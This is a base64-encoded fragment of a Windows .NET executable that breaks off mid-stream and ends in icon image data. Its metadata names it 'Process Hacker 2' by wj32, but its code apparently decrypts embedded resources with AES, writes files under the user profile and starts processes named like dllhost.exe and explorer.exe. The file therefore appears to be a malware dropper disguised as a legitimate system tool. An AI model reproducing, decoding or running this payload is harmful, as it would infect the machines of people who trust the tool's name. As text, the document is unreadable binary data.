gAAAAABMIaQFCAAEA/CAAAAAARgKvAWMAAQAcIQAAAABGArgBaAACADQhAAAAAIMAyQFsAAIAUCEAAAAARgLRAXEAAgBoIQAAAAARANoBeAACAIwhAAAAAAEA+AGAAAMAqCEAAAAABhi6ABMABACwIQAAAAADCAwCiwAEANwhAAAAAAYYugATAAQA5CEAAAAAERj1ABcABAA0IgAAAAAGGLoAEwAEADwiAAAAABYAPAIXAAQAbCQAAAAAFgBBApkABADkJAAAAAAWAFUCoAAFABglAAAAABYAigKqAAYAPCUAAAAAFgCWAq4ABgAAAAEAtgEAAAEA7wEAAAEA7wEAAAEATwIAAAEAZAIAAAEAmwIJALoAEwBBALoAvQBRALoAzAARALoAEwBZALoAEwAkALoAEwAsALoAEwA0ALoAEwA8ALoAEwAkAAwCiwAsAAwCiwA0AAwCiwA8AAwCiwBhALoAEwBpALoAEwBxALoAIAF5AC0EawEZAK8BYwAZALgBaAApAE4EeAEZANEBcQCJAGoEiAEZALoAEwCRALoAmAFEABwCkACZALoAEwKhALoAEwCpALoAEwBMALoAJALJACQFMwLJADEFNwLRAEIFFwBMAFQFPAJUAGIFiwDZAHgFSwLhANEBUQLpAKwFVgLZALIFYAL5AM8FZwL5ANYFbAIBAewFcwIJAfUFFwBUAP0FegIRARIGEwDRACQGfgLRADQGhQIhAboAEwApAboAEwA5AbMGmQI5Ab8GnwJBAdYGpQJJAfUGrAJJAQgHsgJJAREHuQIxASEHvwJZAXEH2wJhAboA4QJhAYYH6QIxALoA/AKxAJAHCQNpAaMHDgNpAbUHcQCxAMcHFAPJAM8HGgNxAboAEwB5AboAIwOBAboAEwCJAboAIAGRAboAIAGZAboAIAGhAboAIAGpAboAIAGxAboAIAG5AboAIAHBAboAIAEpAIMAOQEuADsCigMuAEsCwwMuADMCGAIuAFMCGAIuAFsCrwMuACsCegMuAEMCrwMuABMCKAMuABsCMQMuACMCUANAACsA6wBAABMAwwBDABsA0gBDABMAwwBJAIMASgFjABsA0gBjABMAwwBpAIMAXgGAACsA6wCDABsA0gCDAHMA6wCDAHsA6wCJAIMAJQGgACsA6wChAOMA6wChANsA6wCjABMAwwCjAMMAoAHAACsA6wDDANMAGALDABMAwwDgACsA6wAAARMAwwAAASsA6wAgARMAwwAgASsA6wBAASsA6wBAARMAwwBgASsA6wBgARMAwwCAASsA6wCgASsA6wDAARMAwwDAASsA6wDgASsA6wAAAisA6wAAAhMAwwBgAgsC6wAMAREBFgEbAXABdAF/AYQBkwGTAQ4CLgKMAsgC8QIEAx8DBAABAAYABQAAAN4ATwAAAJcBVAAAAEYBWQAAAKMBXgAAADAClAACAAQAAwACAAUABQACAAYABwACAAcACQACAA8ACwB1AHUAiADwAPcA/gAFAQICHgJFAu4CBIAAAAIAJwAAAHwAAAAAAAAAEQkAAAQAAAAAAAAAAAAAAAEACgAAAAAACgAAAAAAAAAAAAAACgATAAAAAAAEAAAAAAAAAAAAAAABAOcAAAAAAAAAAAABAAAA/QcAAAUABAAGAAQAAAAQAAwA7QEAABAAGQDtAQAAAAAbAO0BLQCOAS0ACQIAAAAAADxNb2R1bGU+AG1zY29ybGliAE1pY3Jvc29mdC5WaXN1YWxCYXNpYwBNeUFwcGxpY2F0aW9uAE15AE15Q29tcHV0ZXIATXlQcm9qZWN0AE15V2ViU2VydmljZXMAVGhyZWFkU2FmZU9iamVjdFByb3ZpZGVyYDEAUHJvZ3JhbQBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuQXBwbGljYXRpb25TZXJ2aWNlcwBBcHBsaWNhdGlvbkJhc2UALmN0b3IATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkRldmljZXMAQ29tcHV0ZXIAU3lzdGVtAE9iamVjdAAuY2N0b3IAZ2V0X0NvbXB1dGVyAG1fQ29tcHV0ZXJPYmplY3RQcm92aWRlcgBnZXRfQXBwbGljYXRpb24AbV9BcHBPYmplY3RQcm92aWRlcgBVc2VyAGdldF9Vc2VyAG1fVXNlck9iamVjdFByb3ZpZGVyAGdldF9XZWJTZXJ2aWNlcwBtX015V2ViU2VydmljZXNPYmplY3RQcm92aWRlcgBBcHBsaWNhdGlvbgBXZWJTZXJ2aWNlcwBFcXVhbHMAbwBHZXRIYXNoQ29kZQBUeXBlAEdldFR5cGUAVG9TdHJpbmcAQ3JlYXRlX19JbnN0YW5jZV9fAFQAaW5zdGFuY2UARGlzcG9zZV9fSW5zdGFuY2VfXwBnZXRfR2V0SW5zdGFuY2UAbV9UaHJlYWRTdGF0aWNWYWx1ZQBHZXRJbnN0YW5jZQBNYWluAEFFU19EZWNyeXB0b3IAaW5wdXQAR2V0VGhlUmVzb3VyY2UAR2V0XwBTeXN0ZW0uVGhyZWFkaW5nAE11dGV4AF9hcHBNdXRleABDcmVhdGVNdXRleABHRVRQAFN0clAAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMATGlzdGAxAExpc3QAd29ya3BhdGgAc3AAbXR4AFN5c3RlbS5Db21wb25lbnRNb2RlbABFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUARWRpdG9yQnJvd3NhYmxlU3RhdGUAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAR2VuZXJhdGVkQ29kZUF0dHJpYnV0ZQBTeXN0ZW0uRGlhZ25vc3RpY3MARGVidWdnZXJIaWRkZW5BdHRyaWJ1dGUATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkNvbXBpbGVyU2VydmljZXMAU3RhbmRhcmRNb2R1bGVBdHRyaWJ1dGUASGlkZU1vZHVsZU5hbWVBdHRyaWJ1dGUAU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbgBIZWxwS2V5d29yZEF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAFJ1bnRpbWVIZWxwZXJzAEdldE9iamVjdFZhbHVlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAEFjdGl2YXRvcgBDcmVhdGVJbnN0YW5jZQBNeUdyb3VwQ29sbGVjdGlvbkF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAQ29tVmlzaWJsZUF0dHJpYnV0ZQBUaHJlYWRTdGF0aWNBdHRyaWJ1dGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAU3RyaW5nAElFbnVtZXJhYmxlYDEARW51bWVyYXRvcgBFbnZpcm9ubWVudABnZXRfRXhpdENvZGUARXhpdABQcm9qZWN0RGF0YQBDbGVhclByb2plY3RFcnJvcgBHZXRFbnVtZXJhdG9yAGdldF9DdXJyZW50AE9wZXJhdG9ycwBDb25jYXRlbmF0ZU9iamVjdABDb252ZXJzaW9ucwBTdHJpbmdzAENvbXBhcmVNZXRob2QAU3BsaXQAQ29tcGFyZVN0cmluZwBTeXN0ZW0uSU8ARmlsZQBFeGlzdHMAV3JpdGVBbGxCeXRlcwBQcm9jZXNzAFN0YXJ0AEdDAENvbGxlY3QATW92ZU5leHQASURpc3Bvc2FibGUARGlzcG9zZQBFeGNlcHRpb24AU2V0UHJvamVjdEVycm9yAENyZWF0ZVByb2plY3RFcnJvcgBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5AFJpam5kYWVsTWFuYWdlZABNRDVDcnlwdG9TZXJ2aWNlUHJvdmlkZXIASUNyeXB0b1RyYW5zZm9ybQBTeXN0ZW0uVGV4dABFbmNvZGluZwBnZXRfRGVmYXVsdABHZXRCeXRlcwBIYXNoQWxnb3JpdGhtAENvbXB1dGVIYXNoAFN5bW1ldHJpY0FsZ29yaXRobQBzZXRfS2V5AENpcGhlck1vZGUAc2V0X01vZGUAQ3JlYXRlRGVjcnlwdG9yAFRyYW5zZm9ybUZpbmFsQmxvY2sAU3lzdGVtLlJlZmxlY3Rpb24AQXNzZW1ibHkAU3lzdGVtLlJlc291cmNlcwBSZXNvdXJjZU1hbmFnZXIAR2V0RXhlY3V0aW5nQXNzZW1ibHkAR2V0T2JqZWN0AENvbnRhaW5zAEFwcERvbWFpbgBnZXRfQ3VycmVudERvbWFpbgBnZXRfQmFzZURpcmVjdG9yeQBSZXBsYWNlAEV4cGFuZEVudmlyb25tZW50VmFyaWFibGVzAFNUQVRocmVhZEF0dHJpYnV0ZQBoaGFoLlJlc291cmNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQB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HJjclJ3d3dzdXd3d/iAAAAAAAAAAIJycnISADVwdXB3d3iIiP8AAAAAAAAAAIEAAABBd2d4iI+I+PgAAAAAAAAAAAAAAIYXd3iIiIj4jwAAAAAAAAAAAAAAAAAAAIiIiPj4AAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///////8AAP///////wAA////////AAD///+A//8AAP///AAP/wAA///wAAP/AAD//8AAAf8AAP//gAAA/wAA//+AAAD/AAD//4AAAP8AAP//gAAA/wAA4//AAACfAADAB+AAAB8AAIAB+AAAHwAAgAB/AAAfAACAABwAAA8AAIAAAAAADwAAgAAAAAAPAACAAAAAAA8AAIAAAAAADwAAgAAAAAAPAACAAAAAAA8AAIAAAAAADwAAgAAAAAAPAACAAAAAAAcAAIAAAAAABwAAgAAAAAAHAACAAAAAAAcAAIAAAAAABwAAwAAAAAAHAADAAAAAAAcAAMAAAAAABwAAwAAAAAADAADAAAAAAAMAAOAAAAAAAwAA/AAAAAADAAD/gAAAAAMAAP/wAAAAAwAA//gAAAADAAD/+AAAAAcAAP/4AAAB/wAA//gAAf//AAD/+AH///8AAP/9/////wAA////////AAD///////8AAP///////wAA////////AAAoAAAAIAAAAEAAAAABAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAgAAAAICAAIAAAACAAIAAgIAAAICAgADAwMAAAAD/AAD/AAAA//8A/wAAAP8A/wD//wAA////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIj4gAAAAAAAAAAAAAAAAIj/iPiAAAAAAAAAAAAAAIj4+Ij4iIAAAAAAAAAAAAiIiPj4iIiIAAAAAAAAAAAIiI+PiIiIeAAAAAAAAAAACIiIiIiId3gAAAAHdwAAAACIiIiHd3eIiAAAeI93d4AAAIeHd3d4iIiAAHh4iHd4cAAId3ePiHeIgACIeIePd3d4iIh3cwAAiIAAeIeHd4j/iHNhAAAHJy9wAIiIeIeHMAAAACJ2NhB4gAB4h4eCAAAAIWNqEiJhf3AAiIiH8AAmNyQAI2WnJjiAAH94h4c2OgAAMGI2JyNvgACIeIiHAiIgAiI2pyNnOIAAeHiIhyJyJDY2pyend2iAAHh4iIgHJjIiQqdyd2c4iAB7ePiIJwAkMhB3eqc2OIgAcniIiAcAIiYHJycnd3f3AHR4+PhwJyenJ3d3p3d3iACHj/iINhAiIQd3d3cnKIgAAIiP+HAEEkJWNjY3d3f3AAAACIhwImNyN3d3d3d3+AAAAAAIdwcCBQd3d4eIiPgAAAAAAIAAV3d4iIiIj4/wAAAAAACHiIiI+PgAAAAAAAAAAAAAj4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////////////4P///4A///4AD//8AAf//AAH//wAB/H+AAHgD4AA4APAAOAAAADgAAAA4AAAAOAAAADgAAAA4AAAAOAAAADgAAAA4AAAAGAAAABgAAAAYAAAAGAAAAB4AAAAfwAAAH/AAAB/4AAA/+AB///j/////////////8oAAAAGAAAADAAAAABAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAgAAAAICAAIAAAACAAIAAgIAAAICAgADAwMAAAAD/AAD/AAAA//8A/wAAAP8A/wD//wAA////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj4AAAAAAAAAAAAiPiPiAAAAAAAAAAIiP+IiIAAAAAAAAAI+IiIh4gAAAAHcHcAiIh3d4iAAACIiHh3AHd4iIiAAAB4eIh4eIh3cAeAAACIh4eHdwACAwCAAACIh4AAAAAnJHKAAACIiIACJycicieIAACIeIY2AACnJyd4AACHiIAjIqNnJ6d4AACHiIcgIkJ3Nnd4AAByiIUAYyF3ejY4AACHj4MCInYmNnd4AAAAiPZwcgd3d3d4AAAAAIcABSd4iIj4AAAAAAh3d4iIj4+AAAAAAAiPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP////////////j////AP///gB///4AP/+TAB//AMAf/wAAH/8AAB//AAAf/wAAD/8AAA//AAAP/wAAD/8AAA//AAAP/8AAD//wAA//+AAf//j///////////////////ygAAAAQAAAAIAAAAAEABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAgICAAMDAwAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAAAAAAAAAB3cACIh4eAAIeAAPiIhwAAiIAAAIdwAACIiIiIiIh4eIiIiIiIiIiIiIiAAAAAAPeIiIAABydwiIp4gHACKieIgXiKIBp1qoiIj3AiZ3d1iAAIgEo3d3eIAAiAMEclY4gACIeIeIiIiAAIj4iIiIiIAAAAAAAAAAD/////HAf//xwP//8fH///AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//+AA///gAP//4AD//+AA////////KAAAADAAAABgAAAAAQAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHCgcADAwMAA0UDQALGQsAEhISABQaFAAaGhoAJwACAAo9CQAVIxUAFigWABskGwAcKhwAEjoRAB4zHgAjJCMAIikiACwsLAAiNCIAIzsjACwzLAArOysANDQ0ADQ+NAA7PDsAFksVAAZUGwAWUxUADngMABNkEgAVaxMAE3MRABV4EwAaehcAHHQaACB4HwAlQiUAKEonACtFKwArSysAJVUlAC1SLQA0QzQAMksyADtDOwA+Sj4AMVMxADNcMwA7UzsAO1w7ACZ2JQA2YzYAOmQ6ADprOgA1djQAPXA9ADl7OABDQ0MARUtFAE1NTQBUS0MAQVVBAEVZRQBOV04ATF5MAFJSUgBTX1MAXFxcAGNEVQBCYkIAQ21DAE1tTQBHc0cAU2xTAF9iXwBbbVsAVHRUAFR4VABcdFwAWnlaAGJiYgBqZGQAZmxmAGZnaABqamoAfG1sAGN2YwBjemMAaXVpAGt7awBycnIAfXJ0AHN8cwB4eHcAe3t7AIN7egAOiwsAD50LABSCEgAZhhcAHowcABWeEwARqg4AFKIQABWrEgAcpBkAFbARAB6wHAAcvxkAIqwfACKzHwAgvB4AJIciACeIJQAojyYALYQsACWSIwAjmiEAK5IpACyfKgAynC8ANoI2ADOMMQA5ijgAM5AyADabNAA9lDwAPJo6ACa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